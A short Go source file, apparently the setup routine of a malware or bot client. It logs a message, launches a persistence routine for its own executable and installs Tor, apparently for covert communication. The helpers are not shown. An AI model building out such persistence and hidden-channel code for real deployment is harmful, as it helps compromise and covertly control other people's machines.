package client

import (
	"log"
)

func Setup() {
	log.Println("Setup")
	go Persist(PathExe)
	installTor()
}
